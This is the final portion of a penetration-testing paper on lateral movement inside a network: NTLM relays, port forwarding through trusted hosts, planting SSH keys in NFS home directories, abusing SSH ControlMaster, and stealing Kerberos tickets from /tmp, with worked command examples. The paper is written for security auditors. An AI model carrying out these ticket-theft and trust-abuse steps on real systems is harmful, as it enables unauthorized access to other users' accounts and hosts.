### 4.3.4 Authentication Relays

In the External Networks section, we discussed a relay attack against SMB and other NTLM-related services. From an external network, this attack is somewhat limited because Windows XP and newer systems do not automatically negotiate NTLM. However, on an internal network, this attack can be devastating when combined with DNS, WINS, or NetBIOS attacks. If an auditor can spoof the name of a trusted server, they can use the relay attack to connect back to the client system via SMB. If the user has administrative access, the attacker can take full control of the system through the file system and service functions.

### 4.4 Trust Relationships

Trusts are a critical concept in penetration testing. They encompass various types of agreements between entities that allow for some form of access. These include:

- **Host to Host**
- **Network Range to Host**
- **User to Host**
- **User to Network**
- **Authentication Tickets/Tokens**
- **Applications**

If an auditor gains access to one entity, they can often leverage the trust relationship with another entity to gain an advantage. For example, if the target (192.168.0.1) is running SSH on port 22 but is configured with TCP Wrappers to only allow connections from the 192.168.1 address range, the auditor cannot directly log in. However, if the auditor compromises a system on the 192.168.1 network, they can leverage that trust to log in to the target system via SSH or by setting up a port forward:

```bash
# Create a port forward from 192.168.1.2 to 192.168.0.1
$ datapipe 192.168.1.2 22 192.168.0.1 22
# Bounce through the port forward to 192.168.0.1 port 22
$ ssh 192.168.1.2
```

A real-world example of an interesting trust was encountered in a custom software licensing and distribution application. All computers on the target network were required to have this software installed, and it ran with administrative privileges. The application contained an administrative username and password in its code. By reverse-engineering the application, the account information was extracted. The auditors then leveraged the fact that this account was widely trusted to compromise every host on the network. Any resource trusted by multiple users or computers is a potential leverage point for the auditor.

### 4.4.1 NFS Home Directories

Many large networks use the Network File System (NFS) protocol to share files and home directories with clients. Typically, port 2049 (UDP or TCP) is open on the server, and a directory is exported either to anyone or to specific hosts with read/write/execute permissions. Clients mount these exported directories, which appear as local directories on their file systems. Often, NFS is used with Network Information Services (NIS) to automatically configure exports and authenticate users. This setup allows any user to log in on any machine and receive the same home directory.

An attacker can develop a scanner for port 2049 to locate NFS servers on the target network. The `showmount` tool can provide information about the NFS server configuration:

```bash
# su - alice
[alice@homeserver ~] cd .ssh
[alice@homeserver .ssh] ssh-keygen -t rsa
Enter file in which to save the key (/home/alice/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/alice/.ssh/id_rsa.
Your public key has been saved in /home/alice/.ssh/id_rsa.pub.
The key fingerprint is:
e7:49:6a:eb:a9:a6:e4:b2:66:41:7e:ee:23:12:4c:28 alice@homeserver
[alice@homeserver ~] cp id_rsa.pub authorized_keys ; showmount -a homeserver
tetris:/vol/home/alice
[alice@homeserver ~] ssh tetris
Last login: Thu Jun 28 11:53:18 2007 from homeserver
[alice@tetrix ~]
```

### 4.4.2 Hijacking SSH

SSH can be used to gather intelligence about other potential targets on the network. Each time a user connects to a system using SSH, a file called `known_hosts` is created in the `.ssh` directory. By examining this file, an attacker can see other hosts that trust the user:

```bash
[alice@homeserver .ssh]$ cat known_hosts
dontownme,192.168.1.20 ssh-rsa AAABB3Nza[...]QSM=
justanothertarget,192.168.1.21 ssh-rsa AAAB2NzaC[...]rQ=
```

Using the SSH keys, an attacker can potentially log into any of these hosts as `alice` without a password. SSH master mode is another feature that can help the auditor penetrate new hosts without using exploits. Master mode allows the user to set up a tunnel for multiple sessions over the same SSH connection without re-authentication. This means that if one SSH connection is set up to a host using master mode, the attacker can spawn other sessions over the same connection without needing a password or key.

To enable master mode, the user's SSH configuration file can be modified:

```bash
Edit ~/.ssh/config
Add:
Host *
    ControlMaster auto
    ControlPath ~/.ssh/sockets/%r@%h:%p
mkdir ~/.ssh/sockets
```

Now, when the user SSHs to another host, it will be as if they used the `-M` switch. If the attacker becomes the user, they can then SSH to the host without authenticating over the existing connection.

### 4.4.3 Hijacking Kerberos

Kerberos is an authentication protocol that provides strong authentication for client/server applications using secret-key cryptography. It generates "tickets" for authentication to various services. On many operating systems, this ticket is stored as a file owned by the specific user in the `/tmp` directory, starting with the name `krb`.

Kerberos hijacking involves capturing a user's ticket and using it to access resources that trust the user. This attack abuses the fact that each node trusts the Kerberos system, allowing the attacker to move around the network, compromising hosts without using exploits or setting off alarms.

The general procedure for hijacking Kerberos tickets includes:

1. Gaining root access to a Kerberized system with multiple users.
2. Finding a user to target and listing all files in `/tmp`.
3. Switching to the user and invoking `klist` to determine the expected ticket filename.
4. Copying the ticket from `/tmp` to the expected filename.
5. Invoking `kinit` to check the ticket status.

Once the ticket is hijacked, the attacker can log into any Kerberized system that trusts the hijacked user without supplying a password.

Example:

```bash
target|alice|1> klist
Default principal: alice@target
Valid starting Expires Service principal
06/28/07 11:03:25 06/28/07 21:03:25 krbtgt/target@target
renew until 07/05/07 11:03:25
Kerberos 4 ticket cache: /tmp/tkt5116
klist: You have no tickets cached

Bash-3.00# ls -al /tmp/krb*
-rw------- 1 alice eng 383 Jun 28 08:19 /tmp/krb5cc_10595_ZH8kq4 <---- FREE ACCESS!
Bash-3.00# klist
Ticket cache: FILE:/tmp/krb5cc_6425 <---- expected filename
Default principal: valsmith@target
Valid starting Expires Service principal
06/28/07 12:14:50 06/28/07 22:14:50 krbtgt/target@target
renew until 07/05/07 12:14:39

Change the file to the expected name and check status:
Bash-3.00# cp /tmp/krb5cc_10595_ZH8kq4 /tmp/krb5cc_6425
Bash-3.00# klist
Ticket cache: FILE:/tmp/krb5cc_6425
Default principal: alice@target <--- we are now her!
Valid starting Expires Service principal
06/28/07 08:19:42 06/28/07 18:19:42 krbtgt/target@target
renew until 07/05/07 08:19:42
```

Other methods of attacking Kerberos include generating or acquiring a valid ticket and placing the attacker's username in another user's `.klogin` file. This allows the attacker to log in anywhere the target user is trusted. It is also important to copy the ticket files to a safe location to prevent loss if the user runs `kdestroy`. Intelligence gathering can also be done with Kerberos, such as finding the `.klogin` file in the root user's home directory, which lists users authorized to `su` to root using Kerberos.

### Chapter 5 Conclusion

The techniques described in this paper demonstrate how even a fully-patched network can be compromised by a determined attacker. Professional security testers have a wide range of attacks available to them that are rarely, if ever, part of a checklist-based methodology. The best attack tool remains the human brain.

### Bibliography

1. Paterva A new train of thought. [http://www.paterva.com](http://www.paterva.com)
2. Apache Dynamic Virtual Hosting. [http://httpd.apache.org/docs/2.0/vhosts/mass.html](http://httpd.apache.org/docs/2.0/vhosts/mass.html)
3. hping2 Active Network Security Tool. [http://www.hping.org/](http://www.hping.org/)
4. Nmap Network Security Scanner. [http://insecure.org/nmap/](http://insecure.org/nmap/)
5. Amap Application fingerprint mapper. [http://www.thc.org/thc-amap/](http://www.thc.org/thc-amap/)
6. Nikto Web Server Vulnerability Scanner. [http://www.cirt.net/code/nikto.shtml](http://www.cirt.net/code/nikto.shtml)
7. Nessus Vulnerability Scanner. [http://www.nessus.org/](http://www.nessus.org/)
8. Web Application Attack and Audit Framework. [http://w3af.sourceforge.net/](http://w3af.sourceforge.net/)
9. Blind Port Scanning. [http://insecure.org/nmap/idlescan.html](http://insecure.org/nmap/idlescan.html)
10. An Implementation of a Birthday Attack in a DNS Spoofing. [http://archive.cert.uni-stuttgart.de/bugtraq/2003/04/msg00311.html](http://archive.cert.uni-stuttgart.de/bugtraq/2003/04/msg00311.html)
11. Cain & Abel. [http://www.oxid.it/cain.html](http://www.oxid.it/cain.html)
12. Rogue Server Project. [http://www.inventgeek.com/Projects/projectsilver/projectsilver.aspx](http://www.inventgeek.com/Projects/projectsilver/projectsilver.aspx)
13. Passive Aggression. [http://www.seifried.org/security/network/20010926-ftp-protocol.html](http://www.seifried.org/security/network/20010926-ftp-protocol.html)
14. Attacking NTLM with Precomputed Hashtables. [http://uninformed.org/?v=3&a=2&t=sumry](http://uninformed.org/?v=3&a=2&t=sumry)